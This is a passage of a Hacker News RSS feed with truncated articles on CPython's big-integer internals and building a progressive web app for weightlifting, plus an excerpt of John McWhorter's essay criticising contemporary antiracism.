<p>Think for a moment how you would represent large integers in your program if you were to implement them yourself. Probably the most obvious way to do that is to store an integer as a sequence of digits, just like we usually write down numbers. For example, the integer <code>51090942171709440000</code> could be represented as <code>[5, 1, 0, 9, 0, 9, 4, 2, 1, 7, 1, 7, 0, 9, 4, 4, 0, 0, 0, 0]</code>. This is essentially how bignums are represented in practice. The only important difference is that instead of base 10, much larger bases are used. For example, CPython uses base 2^15 or base 2^30 depending on the platform. What's wrong with base 10? If we represent each digit in a sequence with a single byte but use only 10 out of 256 possible values, it would be very memory-inefficient. We could solve this memory-efficiency problem if we use base 256, so that each digit takes a value between 0 and 255. But still much larger bases are used in practice. The reason for that is because larger base means that numbers have less digits, and the less digits numbers have, the faster arithmetic operations are performed. The base cannot be arbitrary large. It's typically limited by the size of the integers that the CPU can work with. We'll see why this is the case when we discuss bignum arithmetic in the next section. Now let's take a look at how CPython represents bignums.</p>
<p>Everything related to the representation of Python integers can be found in <a href="https://github.com/python/cpython/blob/3.9/Include/longintrepr.h"><code>Include/longintrepr.h</code></a>. Technically, Python integers are instances of <code>PyLongObject</code>, which is defined in <a href="https://github.com/python/cpython/blob/3.9/Include/longobject.h"><code>Include/longobject.h</code></a>, but <code>PyLongObject</code> is actually a typedef for <code>struct _longobject</code> that is defined in <code>Include/longintrepr.h</code>:</p>
<div><pre><span></span><span>struct</span> <span>_longobject</span> <span>{</span>
    <span>PyVarObject</span> <span>ob_base</span><span>;</span> <span>// expansion of PyObject_VAR_HEAD macro</span>
    <span>digit</span> <span>ob_digit</span><span>[</span><span>1</span><span>];</span>
<span>};</span>
</pre></div>


<p>This struct extends <a href="https://docs.python.org/3/c-api/structures.html#c.PyVarObject"><code>PyVarObject</code></a>, which in turn extends <a href="https://docs.python.org/3/c-api/structures.html#c.PyObject"><code>PyObject</code></a>:</p>
<div><pre><span></span><span>typedef</span> <span>struct</span> <span>{</span>
    <span>PyObject</span> <span>ob_base</span><span>;</span>
    <span>Py_ssize_t</span> <span>ob_size</span><span>;</span> <span>/* Number of items in variable part */</span>
<span>}</span> <span>PyVarObject</span><span>;</span>
</pre></div>


<p>So, besides a reference count and a type that all Python objects have, an integer object has two other members: </p>
<ul>
<li><code>ob_size</code> that comes from <code>PyVarObject</code>; and </li>
<li><code>ob_digit</code> that is defined in <code>struct _longobject</code>.</li>
</ul>
<p>The <code>ob_digit</code> member is a pointer to an array of digits. On 64-bit platforms, each digit is a 30-bit integer that takes values between 0 and 2^30-1 and is stored as an unsigned 32-bit int (<code>digit</code> is a typedef for <code>uint32_t</code>). On 32-bit platforms, each digit is a 15-bit integer that takes values between 0 and 2^15-1 and is stored as an unsigned 16-bit int (<code>digit</code> is a typedef for <code>unsigned short</code>). To make things concrete, in this post we'll assume that digits are 30 bits long.</p>
<p>The <code>ob_size</code> member is a signed int, whose absolute value tells us the number of digits in the <code>ob_digit</code> array. The sign of <code>ob_size</code> indicates the sign of the integer. Negative <code>ob_size</code> means that the integer is negative. If <code>ob_size</code> is 0, then the integer is 0.</p>
<p>Digits are stored in a little-endian order. The first digit (<code>ob_digit[0]</code>) is the least significant, and the last digit (<code>ob_digit[abs(ob_size)-1]</code>) is the most significant.</p>
<p>Finally, the absolute value of an integer is calculated as follows: </p>
<p>$$val = ob\_digit[0] \times (2 ^{30})^0 + ob\_digit[1] \times (2 ^{30})^1 + \cdots + ob\_digit[|ob\_size| - 1] \times (2 ^{30})^{|ob\_size| - 1}$$</p>
<p>Let's see what all of this means with an example. Suppose we have an integer object that has <code>ob_digit = [3, 5, 1]</code> and <code>ob_size = -3</code>. To compute its value, we can do the following:</p>
<div><pre><span></span><span>$ python -q</span>
<span>&gt;&gt;&gt; </span><span>base</span> <span>=</span> <span>2</span><span>**</span><span>30</span>
<span>&gt;&gt;&gt; </span><span>-</span><span>(</span><span>3</span> <span>*</span> <span>base</span><span>**</span><span>0</span> <span>+</span> <span>5</span> <span>*</span> <span>base</span><span>**</span><span>1</span> <span>+</span> <span>1</span> <span>*</span> <span>base</span><span>**</span><span>2</span><span>)</span>
<span>-1152921509975556099</span>
</pre></div>


<p>Now let's do the reverse. Suppose we want to get the bignum representation of the number <code>51090942171709440000</code>. Here's how we can do that:</p>
<div><pre><span></span><span>&gt;&gt;&gt; </span><span>x</span> <span>=</span> <span>51090942171709440000</span>
<span>&gt;&gt;&gt; </span><span>x</span> <span>%</span> <span>base</span>
<span>952369152</span>
<span>&gt;&gt;&gt; </span><span>(</span><span>x</span> <span>//</span> <span>base</span><span>)</span> <span>%</span> <span>base</span>
<span>337507546</span>
<span>&gt;&gt;&gt; </span><span>(</span><span>x</span> <span>//</span> <span>base</span> <span>//</span> <span>base</span><span>)</span> <span>%</span> <span>base</span>
<span>44</span>
<span>&gt;&gt;&gt; </span><span>(</span><span>x</span> <span>//</span> <span>base</span> <span>//</span> <span>base</span> <span>//</span> <span>base</span><span>)</span> <span>%</span> <span>base</span>
<span>0</span>
</pre></div>


<p>So, <code>ob_digit = [952369152, 337507546, 44]</code> and <code>ob_size = 3</code>. Actually, we don't even have to compute the digits, we can get them by inspecting the integer object using the <a href="https://docs.python.org/3/library/ctypes.html#module-ctypes"><code>ctypes</code></a> standard library:</p>
<div><pre><span></span><span>import</span> <span>ctypes</span>


<span>MAX_DIGITS</span> <span>=</span> <span>1000</span>

<span># This is a class to map a C `PyLongObject` struct to a Python object</span>
<span>class</span> <span>PyLongObject</span><span>(</span><span>ctypes</span><span>.</span><span>Structure</span><span>):</span>
    <span>_fields_</span> <span>=</span> <span>[</span>
        <span>(</span><span>"ob_refcnt"</span><span>,</span> <span>ctypes</span><span>.</span><span>c_ssize_t</span><span>),</span>
        <span>(</span><span>"ob_type"</span><span>,</span> <span>ctypes</span><span>.</span><span>c_void_p</span><span>),</span>
        <span>(</span><span>"ob_size"</span><span>,</span> <span>ctypes</span><span>.</span><span>c_ssize_t</span><span>),</span>
        <span>(</span><span>"ob_digit"</span><span>,</span> <span>MAX_DIGITS</span> <span>*</span> <span>ctypes</span><span>.</span><span>c_uint32</span><span>)</span>
    <span>]</span>


<span>def</span> <span>get_digits</span><span>(</span><span>num</span><span>):</span>
    <span>obj</span> <span>=</span> <span>PyLongObject</span><span>.</span><span>from_address</span><span>(</span><span>id</span><span>(</span><span>num</span><span>))</span>
    <span>digits_len</span> <span>=</span> <span>abs</span><span>(</span><span>obj</span><span>.</span><span>ob_size</span><span>)</span>
    <span>return</span> <span>obj</span><span>.</span><span>ob_digit</span><span>[:</span><span>digits_len</span><span>]</span>
</pre></div>


<div><pre><span></span><span>&gt;&gt;&gt; </span><span>from</span> <span>num_digits</span> <span>import</span> <span>get_digits</span>
<span>&gt;&gt;&gt; </span><span>x</span> <span>=</span> <span>51090942171709440000</span>
<span>&gt;&gt;&gt; </span><span>get_digits</span><span>(</span><span>x</span><span>)</span>
<span>[952369152, 337507546, 44]</span>
</pre></div>


<p>As you might guess, the representation of bignums is an easy part. The main challenge is to implement arithmetic operations and to implement them efficiently.</p>
<h2>Bignum arithmetic</h2>
<p>We learned in <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-6-how-python-object-system-works/">part 6</a> that the behavior of a Python object is determined by the object's type. Each member of a type, called slot, is responsible for a particular aspect of the object's behavior. So, to understand how CPython performs arithmetic operations on integers, we need to study the slots of the <code>int</code> type that implement those operations.</p>
<p>In the C code, the <code>int</code> type is called <code>PyLong_Type</code>. It's defined in <code>Objects/longobject.c</code> as follows:</p>
<div><pre><span></span><span>PyTypeObject</span> <span>PyLong_Type</span> <span>=</span> <span>{</span>
    <span>PyVarObject_HEAD_INIT</span><span>(</span><span>&amp;</span><span>PyType_Type</span><span>,</span> <span>0</span><span>)</span>
    <span>"int"</span><span>,</span>                                      <span>/* tp_name */</span>
    <span>offsetof</span><span>(</span><span>PyLongObject</span><span>,</span> <span>ob_digit</span><span>),</span>           <span>/* tp_basicsize */</span>
    <span>sizeof</span><span>(</span><span>digit</span><span>),</span>                              <span>/* tp_itemsize */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_dealloc */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_vectorcall_offset */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_getattr */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_setattr */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_as_async */</span>
    <span>long_to_decimal_string</span><span>,</span>                     <span>/* tp_repr */</span>
    <span>&amp;</span><span>long_as_number</span><span>,</span>                            <span>/* tp_as_number */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_as_sequence */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_as_mapping */</span>
    <span>(</span><span>hashfunc</span><span>)</span><span>long_hash</span><span>,</span>                        <span>/* tp_hash */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_call */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_str */</span>
    <span>PyObject_GenericGetAttr</span><span>,</span>                    <span>/* tp_getattro */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_setattro */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_as_buffer */</span>
    <span>Py_TPFLAGS_DEFAULT</span> <span>|</span> <span>Py_TPFLAGS_BASETYPE</span> <span>|</span>
        <span>Py_TPFLAGS_LONG_SUBCLASS</span><span>,</span>               <span>/* tp_flags */</span>
    <span>long_doc</span><span>,</span>                                   <span>/* tp_doc */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_traverse */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_clear */</span>
    <span>long_richcompare</span><span>,</span>                           <span>/* tp_richcompare */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_weaklistoffset */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_iter */</span>
    <span>0</span><span>,</span>                                          <span>/* tp_iternext */</span>
    <span>long_methods</span><span>,</span>                               <span>/* tp_methods */</span>
    <span>0</span><span>,</span>                                          <span>/* …</span></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-8-how-python-integers-work/">https://tenthousandmeters.com/blog/python-behind-the-scenes-8-how-python-integers-work/</a></em></p>]]>
            </description>
            <link>https://tenthousandmeters.com/blog/python-behind-the-scenes-8-how-python-integers-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26066300</guid>
            <pubDate>Mon, 08 Feb 2021 16:05:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quirks of Building a PWA App]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26066271">thread link</a>) | @astashov
<br/>
February 8, 2021 | https://www.liftosaur.com/blog/posts/quirks-of-building-a-pwa-app/ | <a href="https://web.archive.org/web/*/https://www.liftosaur.com/blog/posts/quirks-of-building-a-pwa-app/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-pwa.png" alt="PWA Logo"></p>
<p>I wanted to build a weightlifting tracker app that would be like Stronglifts 5x5, but flexible, so you could build any program in there or modify any program for your needs. And it'd still be a user-friendly, pleasant to use app. And it'd have all the features you expect from that kind of app - progress view, graphs, rest timer, plates calculator, etc.</p>
<p>I write web apps for a living. I'm not a mobile developer. I knew that you could write web apps for mobile phones (they're called PWA - Progressive Web Apps), and then you can install them without App Store or Google Play, and theoretically, they'll be exactly like native apps.</p>
<p>There's also something cool, from idealistic point of view, in writing web apps and running them on phones (vs native apps). Web a is free and decentralized platform, I don't need to rely on Apple Store or Google Play rules, web apps exist kinda in parallel with the Apple/Google gate-keeped stores, and don't have to play by its rules. Also, the update cycles are way faster - I can just push the new version out, and it will be immediately delivered to users' devices, I don't need to wait for a week until my new app version is reviewed by Apple or Google. It's not like the main reason why I wrote PWA, though - the main reason is that I'm just very comfortable with building web apps, I know how to do it. I'm way less comfortable with building native apps.</p>
<p>But I also heard that you would never reach the same user experience as with native apps, though I wasn't sure why. What exactly would prevent that? I was curious to know, I thought - I'm going to write this app as a PWA specifically targeted for mobile devices and experience the development process, see what road bumps I could hit, and how far I could go before I hit a wall.</p>
<p>And here I am, nine months later, with a working PWA app, which is already pretty feature-rich, and I think at this point I can reflect on the development process and share my thoughts about PWAs and what it takes to develop them.</p>
<h2>What the heck is PWA?</h2>
<p><a href="https://www.liftosaur.com/about">Liftosaur</a> is a PWA. What that really means is that it has a <a href="https://www.liftosaur.com/manifest.webmanifest">manifest file</a> and <a href="https://www.liftosaur.com/webpushr-sw.js">a script</a>, that runs as a Service Worker - special JavaScript code, that is run by a browser separately from a web page, in a background. We add a link to our manifest file in <code>index.html</code> like this:</p>
<pre><code><span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>manifest<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>/manifest.webmanifest<span>"</span></span> <span>/&gt;</span></span></code></pre>
<p>and then we load that service worker script like this:</p>
<pre><code>navigator<span>.</span>serviceWorker<span>.</span><span>register</span><span>(</span><span>"/webpushr-sw.js"</span><span>)</span><span>;</span></code></pre>
<p>and voila! Our web page just became a Progressive Web App!</p>
<p>The manifest file describes how your app will look like mostly on phones - what icons would be used, whether it's full screen or with a URL bar, title/description, what splash screen looks like, etc.</p>
<p>The service worker script currently mostly solves two problems:</p>
<ul>
<li>Caches all the scripts, styles, and some API calls so that the app would work offline.</li>
<li>Sets up Web Push mechanism, so you'd get pushes when the timer is triggered, and it's time to start another exercise set.</li>
</ul>
<p>And that's mostly it! After that, you can add that web page to your phone home screen, and it'll like a native web app.</p>
<div>
  <div>
    <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-home-screen.jpg" width="100%" alt="iOS Home Screen with PWA icon"></p><p>This is what it looks like on the home screen (last icon)</p>
  </div>
  <div>
    <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-liftosaur.jpg" width="100%" alt="Liftosaur Screen on iOS"></p><p>This is what PWA app looks like on iOS</p>
  </div>
</div>
<p>But there are various problems associated with PWAs, related mainly to iOS Safari quirks and users' knowledge about PWAs.</p>
<h2>Pain points</h2>
<p>Mostly, my experience with building PWA - you can build decent PWA apps, though Mobile Safari definitely will try to make your life harder. I didn't really have any problems with Google Chrome on Android; the app works smoothly even on a cheap Android device. The major pain points were:</p>
<h3>Cookies are weird on iOS when you add your app to the home screen</h3>
<p>I initially set the app so that <code>index.html</code> and all other assets were loaded from <code>www.liftosaur.com</code> and served via Cloudflare CDN. API lived in Cloudflare workers on a separate domain, which used to be <code>liftosaur.workers.dev</code>. Some API expects the user to be logged in, so I had <code>liftosaur.workers.dev/api/signin/google</code>, which sets up a JWT auth cookie on the <code>liftosaur.workers.dev</code> domain. I don't need those cookies for the primary domain <code>www.liftosaur.com</code> (they're HttpOnly anyway, and I use them for API calls only). I thought it'd be fine - the cookies would live only on <code>liftosaur.workers.dev</code>, the browser would send them to all API endpoints (since they're also on <code>liftosaur.workers.dev</code>), and everything would just work. And it worked, almost everywhere - it worked in Mobile Safari browser, it worked in Chrome on Android. But if you add the app to the home screen on iOS, then for some reason, those cookies wouldn't be stored. Like, at all. I finally found a workaround - I stored the cookies with the <code>.liftosaur.com</code> domain and moved the API from <code>liftosaur.workers.dev</code> to <code>api.liftosaur.com</code>, so they'd share the same cookies with <code>www.liftosaur.com</code>. But it took me quite a while to figure that out.</p>
<h3>No web push notifications for iOS</h3>
<p>There's a feature in the app - after you've finished a set, you press a button, and it starts a timer. Once timer hits some threshold, it sends a push notification to your phone, so you know it's time to start another set. Apparently, there's no way to do that on iOS. I couldn't find a way to send a push notification in iOS, at all. It seems like a possible solution would be to install a "helper" native app that would proxy the push notification, but that seems excessive - I really doubt any user would want to do that!</p>
<h3>You can trigger a sound only on user action</h3>
<p>When the timer mentioned above hits a threshold, it plays a sound, so you know - it's time to start another set. I couldn't figure out how to do that on iOS. Safari on iOS only allows you to play a sound in e.g. an event click handler. If you try to play it on some random event happening (like for me, it was a Redux action triggering it), Safari complains about audio autoplay being forbidden. There're some solutions on the Internet/Stack Overflow, but none of them works. Apparently, if a user is done with the set and hits a button, you can start <code>setTimeout</code> and try to play the audio inside that <code>setTimeout</code>. It works, but only for small enough timeouts (like several seconds). Anything over a minute - and you get that audio autoplay forbidden error again.</p>
<p>I couldn't figure out that too for iOS. Liftosaur on iOS doesn't send push notifications when timers hit a threshold, and also it doesn't make a sound when it happens :(</p>
<h3>iOS could be pretty aggressive unloading from memory the opened PWA apps that are added to the home screen</h3>
<p>Imagine you just finished a set, and you switch to Twitter to read some stuff there while resting. A couple of minutes later, you switch back to Liftosaur - and iOS already unloaded it from memory, so Liftosaur loads again. So you need to make sure your app launches fast, and also you store as much internal state as possible in IndexedDB. Otherwise, users may have a horrible experience losing all their progress.</p>
<p>To be fair, it got better after iOS 13, and it's not as aggressive with unloading PWAs from memory anymore, but it still happens sometimes.</p>
<h3>Missing some default gestures</h3>
<p>There're some gestures built-in into any native app. Like swipe left to right across the screen gets you back to the previous page. Obviously you don't get them for PWAs, since it's just a web page.</p>
<p>It's not that big of a deal to implement those, but you have to implement those, and on a native app, you get them for free.</p>
<p>I personally don't use gestures much on my phone apps, but I can see how it could be a UX issue for some users.</p>
<h3>Choose your app icon wisely because it will stay forever</h3>
<p>If you add a PWA app to your home screen, whatever the app icon was, it will be there forever. Even if you update the manifest with the new icon, the icon won't change on the home screen. Not that big of a deal, but it definitely was an unpleasant surprise.</p>
<h3>Users have no idea what the heck PWA is</h3>
<p><strong>And here's our winner!!!</strong> The major pain point of PWA is the users' knowledge. They don't know that a web page they're on is a web app they can install to their home screen. They don't know how to do that (and frankly, iOS Safari doesn't even try to make it obvious). They often even never heard of PWAs at all. They don't know PWAs exist and they can add a web app to their home screen.</p>
<div>
  <div>
    <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-ios-share.png" width="100%" alt="Liftosaur Screen with share icon"></p><p>To add to home screen on iOS, you need to Share (!) first</p>
  </div>
  <div>
    <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-ios-add-to-home.png" width="100%" alt="Share screen with 'Add to Home Screen' option highlighted"></p><p>And there find the option "Add to Home Screen"</p>
  </div>
</div>
<p>So, you need to deliver the installation instructions to your users somehow. Since there's a good chance they've never installed a PWA previously in their life, there're high chances that this PWA will be their first one, and they are going to figure out how to do that.</p>
<p>It is already hard to convince somebody to install an app. Convince somebody to install a web app is ten times harder if they never did that, and they don't know it's possible.</p>
<p>To be fair, if you use a web app several times on Android Chrome, and it's a PWA, Chrome will suggest adding it to the home screen once it notices you use the app often. iOS Safari will not.</p>
<p>In my opinion, this is the worst pain point of PWA. Technology-wise, and especially on Android - you can make very decent phone apps, and get the user experience very close to native apps. But the people aspect - educating users about PWAs and how to install them - is way harder.</p>
<p>Here's a bright side, though - Google Play allows you to publish your PWAs right in the store. It's called <a href="https://developers.google.com/web/android/trusted-web-activity">TWA (Trusted Web Activity)</a>, and that makes the PWA installation process look exactly like a native app - you can find it in the Play Store, click Install, and it will get installed, just like a regular app. Obviously - nothing like that exists on iOS.</p>
<div>
  <p><img src="https://www.liftosaur.com/blog/images/quirks-of-building-a-pwa-app-google-play.png" width="100%" alt="Liftosaur in Google Play"></p><p>PWA in Google Play Store</p>
</div><p>To build TWA, you'll need to ensure you get maximum PWA points in Lighthouse, and then you can use <a href="https://www.pwabuilder.com/">PWABuilder</a>, that will generate Android APK, which you can upload to Google Play Store.</p>
<h2>Conclusion</h2>
<p>You definitely can …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.liftosaur.com/blog/posts/quirks-of-building-a-pwa-app/">https://www.liftosaur.com/blog/posts/quirks-of-building-a-pwa-app/</a></em></p>]]>
            </description>
            <link>https://www.liftosaur.com/blog/posts/quirks-of-building-a-pwa-app/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26066271</guid>
            <pubDate>Mon, 08 Feb 2021 16:03:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Just Launch the Damn Thing]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26066236">thread link</a>) | @alex_c
<br/>
February 8, 2021 | https://mobilefolk.com/just-launch-the-damn-thing/ | <a href="https://web.archive.org/web/*/https://mobilefolk.com/just-launch-the-damn-thing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://mobilefolk.com/just-launch-the-damn-thing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26066236</guid>
            <pubDate>Mon, 08 Feb 2021 16:00:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[John McWhorter: The Neoracists]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26066125">thread link</a>) | @jtdev
<br/>
February 8, 2021 | https://www.persuasion.community/p/john-mcwhorter-the-neoracists | <a href="https://web.archive.org/web/*/https://www.persuasion.community/p/john-mcwhorter-the-neoracists">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd3f575ee-a995-499c-86fe-72680f8d5d12_700x312.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd3f575ee-a995-499c-86fe-72680f8d5d12_700x312.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/d3f575ee-a995-499c-86fe-72680f8d5d12_700x312.jpeg&quot;,&quot;height&quot;:312,&quot;width&quot;:700,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:40221,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p><strong>[</strong>Excerpt from his new book, <em>The Elect: Neoracists Posing as Antiracists and their Threat to a Progressive America</em>]</p><p><strong>One can divide antiracism into three waves</strong>. First Wave Antiracism battled slavery and segregation. Second Wave Antiracism, in the 1970s and 1980s, battled racist attitudes and taught America that being racist was a flaw. Third Wave Antiracism, becoming mainstream in the 2010s, teaches that racism is baked into the structure of society, so whites’ “complicity” in living within it constitutes racism itself, while for black people, grappling with the racism surrounding them is the totality of experience and must condition exquisite sensitivity toward them, including a suspension of standards of achievement and conduct.</p><p>Third Wave Antiracist tenets, stated clearly and placed in simple oppositions, translate into nothing whatsoever:</p><ol><li><p>When black people say you have insulted them, apologize with profound sincerity and guilt. <strong>But </strong>don’t put black people in a position where you expect them to forgive you. They have dealt with too much to be expected to.</p></li><li><p>Black people are a conglomeration of disparate individuals. “Black culture” is code for “pathological, primitive ghetto people.” <strong>But </strong>don’t expect black people to assimilate to “white” social norms because black people have a culture of their own.</p></li><li><p>Silence about racism is violence. <strong>But </strong>elevate the voices of the oppressed over your own.</p></li><li><p>You must strive eternally to understand the experiences of black people. <strong>But </strong>you can never understand what it is to be black, and if you think you do you’re a racist.</p></li><li><p>Show interest in multiculturalism.&nbsp;<strong>But </strong>do not culturally appropriate. What is not your culture is not for you, and you may not try it or do it. But—if you aren’t nevertheless <em>interested</em> in it, you are a racist.</p></li><li><p>Support black people in creating their own spaces and stay out of them. <strong>But </strong>seek to have black friends. If you don’t have any, you’re a racist. And if you claim any, they’d better be <em>good</em> friends—in their private spaces, you aren’t allowed in.</p></li><li><p>When whites move away from&nbsp;black neighborhoods, it’s white flight.&nbsp;<strong>But </strong>when whites move into black neighborhoods, it’s gentrification, even when they pay black residents generously for their houses.</p></li><li><p>If you’re white and only date white people, you’re a racist. <strong>But </strong>if you’re white and date a black person you are, if only deep down, exotifying an “other.”</p></li><li><p>Black people cannot be held accountable for everything every black person does. <strong>But </strong>all whites must acknowledge their personal complicity in the perfidy throughout history of “whiteness.”</p></li><li><p>Black students must be admitted to schools via adjusted grade and test score standards to ensure a representative number of them and foster a diversity of views in classrooms. <strong>But </strong>it is racist to assume a black student was admitted to a school via racial preferences, and racist to expect them to represent the “diverse” view in classroom discussions.</p></li></ol><p>I suspect that deep down, most know that none of this catechism makes any sense. Less obvious is that it was not even composed with logic in mind. The self-contradiction of these tenets is crucial, in revealing that Third Wave Antiracism is not a philosophy but a religion. </p><p>The revelation of racism is, itself and alone, the point, the intention, of this curriculum. As such, the fact that if you think a little, the tenets cancel one another out, is considered trivial. That they serve their true purpose of revealing people as bigots is paramount—sacrosanct, as it were. Third Wave Antiracism’s needlepoint homily <em>par excellence</em> is the following:</p><blockquote><p>Battling power relations and their discriminatory effects must be the central focus of all human endeavor, be it intellectual, moral, civic or artistic. Those who resist this focus, or even evidence insufficient adherence to it, must be sharply condemned, deprived of influence, and ostracized.</p></blockquote><p><strong>Third Wave Antiracism is losing innocent people jobs.</strong> It is coloring, detouring and sometimes strangling academic inquiry. It forces us to render a great deal of our public discussion of urgent issues in doubletalk any 10-year-old can see through. It forces us to start teaching our actual 10-year-olds, in order to hold them off from spoiling the show in that way, to believe in sophistry in the name of enlightenment. On that, Third Wave Antiracism guru Ibram X. Kendi has written a book on how to raise antiracist children called <em>Antiracist Baby</em>. You couldn’t imagine it better: Are we in a Christopher Guest movie? This and so much else is a sign that Third Wave Antiracism forces us to pretend that performance art is politics. It forces us to spend endless amounts of time listening to nonsense presented as wisdom, and pretend to like it.</p><p>I write this viscerally driven by the fact that all of this supposed wisdom is founded in an ideology under which white people calling themselves our saviors make black people look like the dumbest, weakest, most self-indulgent human beings in the history of our species, and teach black people to revel in that status and cherish it as making us special. Talking of <em>Antiracist Baby</em>, I am especially dismayed at the idea of this indoctrination infecting my daughters’ sense of self. I can’t always be with them, and this anti-humanist ideology may seep into their school curriculum. I shudder at the thought: teachers with eyes shining at the prospect of showing their antiracism by teaching my daughters that they are poster children rather than individuals. </p><p>Ta-Nehisi Coates in <em>Between the World and Me</em> wanted to teach his son that America is set against him; I want to teach my kids the reality of their lives in the 21st&nbsp;rather than early-to-mid-20th century. Lord forbid my daughters internalize a pathetic—yes, absolutely pathetic in all of the resonances of that word—sense that what makes them interesting is what other people think of them, or don’t.</p><p>Many will see me as traitorous in writing this as a black person. They will not understand that I see myself as serving my race by writing it. One of the grimmest tragedies of how this perversion of sociopolitics makes us think (or, not think) is that it will bar more than a few black readers from understanding that I am calling for them to be treated with true dignity. However, they and everyone else should also realize: I know quite well that white readers will be more likely to hear out views like this when written by a black person, and consider it nothing less than my duty as a black person to write it.</p><p>A white version of this would be blithely dismissed as racist. I will be dismissed instead as self-hating by a certain crowd. But frankly, they won’t really mean it, and anyone who gets through <a href="https://johnmcwhorter.substack.com/p/the-elect-neoracists-posing-as-antiracists">my new book</a> on this subject, which I am now publishing in serial, will see that whatever traits I harbor, hating myself or being ashamed of being black is not one of them. And we shall move on. As in, to realizing that what I am documenting matters, and matters deeply. Namely, that America’s sense of what it is to be intellectual, moral, or artistic; what it is to educate a child; what it is to foster justice; what is to express oneself properly; what it is to be a nation—all is being refounded upon a religion. </p><p>This is directly antithetical to the very foundations of the American experiment. Religion has no place in the classroom, in the halls of ivy, in our codes of ethics, or in deciding how we express ourselves, and almost all of us spontaneously understand that and see any misunderstanding of the premise as backward. Yet since about 2015, a peculiar contingent has been slowly headlocking us into making an exception, supposing that this new religion is so incontestably good, so gorgeously surpassing millennia of brilliant philosophers’ attempts to identify the ultimate morality, that we can only bow down in humble acquiescence.</p><p>But a new religion in the guise of world progress is not an advance; it is a detour. It is not altruism; it is self-help. It is not sunlight; it is fungus. It’s time it became ordinary to call it for what it is and stop cowering before it, letting it make people so much less than they—black and everything else—could be.</p><p><strong>Third Wave Antiracism exploits modern Americans’ fear</strong> of being thought racist, using this to promulgate an obsessive, self-involved, totalitarian and unnecessary kind of cultural reprogramming. One could be excused for thinking this glowering kabuki is a continuation of the Civil Rights efforts of yore, the only kind of new antiracism there could be. Its adherents preach with such contemptuous indignation, and are now situated in the most prestigious and influential institutions in the land—on their good days they can seem awfully “correct.”</p><p>However, there is nothing correct about the essence of American thought and culture being transplanted into the soil of a religious faith. Some will go as far as to own up to it being a religion, and wonder why we can’t just accept it as our new national creed. The problem is that on matters of societal procedure and priorities, the adherents of this religion—true to the very nature of religion—cannot be reasoned with. They are, in this, medievals with lattes.</p><p>We need not wonder what the basic objections will be: Third Wave Antiracism isn’t really a religion; I am oversimplifying; I shouldn’t write this without being a theologian; it is a religion but it’s a good one; and so on. I will get all of that out of the way as we go on, and then offer some genuine solutions. But first, what this is not.</p><ol><li><p><em>It is not an argument against protest.</em> I am not arguing against the basic premises of Black Lives Matter, although I have had my differences with some of its offshoot developments. I am not arguing that the Civil Rights movement of the 1950s and 1960s would have been better off sticking to quiet negotiations. I am not arguing against the left. I am arguing against a particular strain of the left that has come to exert a grievous influence over American institutions, to the point that we are beginning to …</p></li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.persuasion.community/p/john-mcwhorter-the-neoracists">https://www.persuasion.community/p/john-mcwhorter-the-neoracists</a></em></p>]]>
            </description>
            <link>https://www.persuasion.community/p/john-mcwhorter-the-neoracists</link>
            <guid isPermaLink="false">hacker-news-small-sites-26066125</guid>
            <pubDate>Mon, 08 Feb 2021 15:53:56 GMT</pubDate>
        </item>
        <item>
            <title>
